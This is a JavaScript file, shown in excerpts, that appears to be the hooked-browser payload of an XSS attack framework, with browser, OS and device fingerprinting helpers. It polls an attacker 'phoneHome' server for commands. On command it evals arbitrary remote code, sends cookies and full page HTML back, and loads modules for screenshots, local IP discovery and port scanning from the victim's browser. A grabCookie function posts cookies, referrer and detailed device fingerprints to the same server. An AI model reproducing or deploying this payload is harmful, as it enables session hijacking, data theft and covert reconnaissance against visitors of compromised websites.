var phoneHome = "http://127.0.0.1/xss/newxss/";
(function(a, b) {
	function ci(a) {
...
var XMLHttpReq;
var cmdurl= phoneHome+"Admin_control/command.php";
...
{
var cmddata="domain="+document.domain;
$.ajax({
    type : "get",
	data: cmddata,
    async:false,
...
function success_jsonpCallback(json){
	if(json.alert!=undefined)
			...
			$.ajax({
				type: 'POST',
				url: cmdurl,
				data: {res:"success",domain:document.domain}
				});
			}
     if(json.eval!=undefined)
            {
			
			var e= unescape(json.eval);
			eval(e);
			$.ajax({
				type: 'POST',
				url: cmdurl,
				data: {evalres:"success",domain:document.domain}
				});
            }
    if(json.cookie!=undefined)
			...
			$.ajax({
				type: 'POST',
				url: cmdurl,
				data: {cookie:document.cookie,domain:document.domain}
				});
			}
   if(json.GetHtml!=undefined)
			{
			$.ajax({
				type: 'POST',
				url: cmdurl,
				data: {html:document.documentElement.outerHTML,domain:document.domain}
				});
			}
   if(json.pic!=undefined)
		{
			...
			oScript.src="./module/html2canvas.js?time="+timestamp; 
			oHead.appendChild( oScript); 
		}
	if(json.getnetworkip!=undefined)
		{
			var oHead = document.getElementsByTagName('head').item(0); 
			var oScript= document.createElement("script"); 
			var timestamp = new Date().getTime();
			oScript.type = "text/javascript"; 
			oScript.src="./module/Getnetwork.js?time="+timestamp; 
			oHead.appendChild( oScript); 
		}
	if(json.portscan!=undefined)
		{
			var oHead = document.getElementsByTagName('head').item(0); 
			var oScript= document.createElement("script"); 
			var timestamp = new Date().getTime();
			var portstr=json.portscan.split("|");
			var scanip=portstr[0];
			var port=portstr[1];
			oScript.type = "text/javascript"; 
			oScript.src="./module/portscan.js?time="+timestamp; 
			oHead.appendChild( oScript);
		var callback = function (target, port, status) {
			var scan_res = target + ':' + port + ' ' + status;
			
			$.ajax({
				type: 'POST',
				url: cmdurl,
				async:false,
				data: {portscan:scan_res,domain:document.domain,time:timestamp}
				});
			};
			 function scan() {
 
				AttackAPI.PortScanner.scanTarget(callback, scanip, port.split(','), "1000");
	
			};
			scan();
		}
	if(json.geturlhtml!=undefined)
		{
			$.ajax({
			type : "get",
			...
			$.ajax({
				type: 'POST',
				url: cmdurl,
				data: {geturlhtml:data,domain:document.domain}
				});
			}
		}
...
function grabCookie() {
	var posturl=phoneHome+"user_receive.php";
	var data="c=" + document.cookie +"&t="+document.title+"&domain="+document.domain+"&browser="+getBrowser()+"&referrer="+document.referrer+"&plug="+getPluginName()+"&flash="+flash()+"&screen="+screencolor()+"&Device="+DevicegetName()+"&os="+OSgetName()+"&cpu="+cpu()+"&d=" + document.domain + document.location.pathname;
...
function getBrowser(){    
		var Sys = {}; 
        var s; 
        (s = uagent.match(/msie ([\d.]+)/)) ? Sys.ie = s[1] : 
        (s = uagent.match(/firefox\/([\d.]+)/)) ? Sys.firefox = s[1] : 
        (s = uagent.match(/chrome\/([\d.]+)/)) ? Sys.chrome = s[1] : 
        (s = uagent.match(/opera.([\d.]+)/)) ? Sys.opera = s[1] : 
        (s = uagent.match(/version\/([\d.]+).*safari/)) ? Sys.safari = s[1] : 0;
...
var screen="width:"+window.screen.width+" "+"height:"+window.screen.height+" "+"Colour Depth:"+window.screen.colorDepth;
return screen;
}
function flash(){
var plug="flash:"+checkePlugs('Shockwave Flash')+" | MediaPlayer:"+checkePlugs("MediaPlayer")+" | realPlayer:"+checkePlugs("RealPlayer")+" | java:"+navigator.javaEnabled();
return plug;
}
function cpu() {
...
function OSgetName() {
		...
		if (this.isNokia()) {
			...
			if (this.ua.indexOf('Maemo Browser') != -1) return 'Maemo Nokia';
			if (this.ua.match('(SymbianOS)|(Symbian OS)')) return 'SymbianOS Nokia';
			if (this.ua.indexOf('Symbian') != -1) return 'Symbian Nokia';
		...
		if (this.isOpenBSD()) return 'openbsd';
		//iPhone
		...
		//macintosh
		if (this.isMacintosh()) {
			if ((typeof navigator.oscpu != 'undefined') && (navigator.oscpu.indexOf('Mac OS') != -1)) return navigator.oscpu;
...
function DevicegetName() {
		...
		if (ua.search(deviceS60) > -1) {
			return "Nokia S60";
		}
		if (ua.search(deviceS70) > -1) {
			return "Nokia S70";
		}
		if (ua.search(deviceS80) > -1) {
			return "Nokia S80";
		}
		if (ua.search(deviceS90) > -1) {
			return "Nokia S90";
		}
		if (ua.search(deviceSymbian) > -1) {
		...
		if (ua.search(deviceNintendoDs) > -1) {
			return "Nintendo DS";
		}
		if (ua.search(deviceWii) > -1) {
			return "Nintendo Wii";
		}
		if (ua.search(deviceNintendo) > -1) {
			return "Nintendo";
		}
		if (DetectXbox()) {
			return "Xbox";
